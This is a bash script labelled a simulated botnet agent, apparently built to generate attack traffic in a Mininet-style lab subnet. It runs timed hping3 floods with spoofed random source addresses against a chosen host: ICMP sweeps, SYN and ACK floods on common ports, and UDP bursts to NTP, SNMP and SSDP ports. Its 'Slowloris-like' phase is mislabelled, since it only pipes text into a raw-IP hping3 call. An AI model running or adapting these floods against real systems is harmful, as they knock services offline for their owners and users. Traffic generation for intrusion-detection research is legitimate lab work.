#!/bin/bash
# Simulated botnet agent – multi-vector attack generator

TARGET_IP=${1:-""}
BOT_ID=${2:-"bot-$(hostname)"}
DURATION=${3:-180}
SLEEP_JITTER=${4:-3}
SUBNET_PREFIX=${SUBNET_PREFIX:-"10.0.0"}  # phù hợp topo MultiSwitch h1-h12
MIN_HOST=${MIN_HOST:-1}
MAX_HOST=${MAX_HOST:-12}

# If no TARGET_IP provided, discover a candidate in the same /24 subnet
if [ -z "$TARGET_IP" ]; then
    my_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    my_last=0
    [ -n "$my_ip" ] && my_last=$(echo "$my_ip" | awk -F. '{print $4}')

    for attempt in $(seq 1 20); do
        r=$((RANDOM % (MAX_HOST - MIN_HOST + 1) + MIN_HOST))
        [ "$r" -eq "$my_last" ] && continue
        cand="${SUBNET_PREFIX}.${r}"
            ping -c1 -W1 "$cand" >/dev/null 2>&1 && TARGET_IP="$cand" && break
        done

        if [ -z "$TARGET_IP" ]; then
            while true; do
            r=$((RANDOM % (MAX_HOST - MIN_HOST + 1) + MIN_HOST))
            [ "$r" -ne "$my_last" ] && TARGET_IP="${SUBNET_PREFIX}.${r}" && break
            done
    fi
fi

echo "[Botnet:${BOT_ID}] Chosen target: ${TARGET_IP}"

log() {
    echo "[Botnet:${BOT_ID}] $1"
}

if ! command -v hping3 >/dev/null 2>&1; then
    log "hping3 not found – install with: sudo apt install hping3"
    exit 1
fi

log "Connecting to simulated C2 server..."
sleep 1
log "Received attack order against ${TARGET_IP} (${DURATION}s)"

end_time=$((SECONDS + DURATION))
phase=0

while [ $SECONDS -lt $end_time ]; do
    phase=$((phase + 1))
    log "Starting phase ${phase}"

    # Phase 1 – reconnaissance ping sweep
    hping3 -1 -c 10 "${TARGET_IP}" >/dev/null 2>&1

    # Phase 2 – SYN + ACK flood on random ports
    for port in 22 53 80 443 8080; do
        hping3 --rand-source -S -p ${port} -i u20000 -c 400 "${TARGET_IP}" >/dev/null 2>&1
        hping3 --rand-source -A -p ${port} -i u25000 -c 200 "${TARGET_IP}" >/dev/null 2>&1
    done

    # Phase 3 – UDP amplification style packets
    for port in 123 161 1900; do
        hping3 --udp --rand-source -p ${port} -i u15000 -c 300 "${TARGET_IP}" >/dev/null 2>&1
    done

    # Phase 4 – Slowloris-like TCP connections (simulate HTTP keep-alive)
    for i in $(seq 1 30); do
        printf "GET /%s HTTP/1.1\r\nHost: %s\r\n\r\n" "${i}" "${TARGET_IP}" | \
            hping3 --rawip --sign botnet --destport 80 --data 40 --fast "${TARGET_IP}" >/dev/null 2>&1
    done

    jitter=$((RANDOM % SLEEP_JITTER + 1))
    log "Phase ${phase} complete – sleeping ${jitter}s"
    sleep ${jitter}
done

log "Attack window elapsed – going idle"

